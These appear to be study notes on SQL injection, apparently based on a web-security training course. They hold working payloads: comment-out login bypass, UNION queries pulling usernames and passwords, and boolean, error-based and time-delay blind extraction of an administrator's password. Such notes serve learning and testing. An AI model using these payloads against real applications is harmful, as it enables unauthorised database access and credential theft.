## What is the impact of a successful SQL injection attack?

- unauthorized access to sensitive data, such as passwords, credit card details, or personal user information
- reputational damage and regulatory fines
- obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period

## SQL injection examples

- Retrieving hidden data
- Subverting application logic
- UNION attacks
- Examining the databases
- Blind SQL injection

1. Retrieving hidden data
   eg - `https://insecure-website.com/products?category=Gifts`
   at backend - `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

   **Injection** - `https://insecure-website.com/products?category=Gifts'--` will cause ` SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`

2. Subverting application logic
   eg - `SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`
   **Injection** - `SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`

3. UNION attacks - Retrieving data from other database tables
   eg - `SELECT name, description FROM products WHERE category = 'Gifts'`
   **Injection** - submit the input with `' UNION SELECT username, password FROM users--`

   - Determining the number of columns required in an SQL injection

   ```
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ```

   - Determining Data Type of the returning columns

   ```
   ' UNION SELECT 'a',NULL,NULL--
   ' UNION SELECT NULL,'a',NULL--
   ' UNION SELECT NULL,NULL,'a'--
   ```

   - Retriving multiple values within a single column

   ```
   ' UNION SELECT username || '=>' || password FROM users--
   ```

   will return only 1 column

4. Examining the databases

   - see the cheat sheet below

5. Blind SQL Injection Vulnerablities

   (i) Triggering conditional responses

   - an application that uses tracking cookies to gather analytics about usage and requests to the application include a cookie header like this;
     `Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`  
     At backend => `SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'`

   - this query is vulnerable to SQL injection but the results are not returned. But the app behaves differently depending on whether the query returns any data, for example - `Welcome back` message is displayed within the page
   - then check the conditions with boolean logic such as

   ```
   ' AND '1'='1'--
   ' AND '1'='2'--
   ```

   and find the differences and remember for the `true` condition.

   - suppose there is a table called `Users` with columns `Username` and `Password` and user called `Administrator`

   ```
   ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm
   ```

   check whether it is true or false if false check with other

   ```
   ' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's
   ```

   - test in Burp Intruder

   (ii) Triggering SQL errors

   ```
   'AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
   'AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
   ```

   - first case, condition 1=2 is false and will return true result
   - second case, condition 1=1 is true and 1/0 is executed and will return an error

   ```
   ' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) = 'm') THEN 1/0 ELSE 'a' END FROM Users) = 'a'--
   ```

   (iii) Triggering time delays

   - delaying the execution of an SQL query will also delay the HTTP response

   ```
   '; IF (1=2) WAITFOR DELAY '0:0:10'--
   '; IF (1=1) WAITFOR DELAY '0:0:10'--
   ```

   The second condition will cause an delay of HTTP response

   ```
   '; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
   ```

   (iv) OAST (out-of-band) techniques

   - when the application's response doesn't depend on whether the query returns any data, or on whether a database error occurs, or on the time taken to execute the query

---

## How to detect SQL injection vulnerabilities

1. Submitting the single quote character `'` and looking for errors or other anomalies
2. Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a differnent value, and looking for systematic differences in the resulting application responses
3. Submitting Boolean conditions such as `OR 1=1` and `OR 1=2` and looking for differneces in the application's responses
4. Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differneces in the time taken to respond
5. Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query and monitoring for any resulting interactions

---
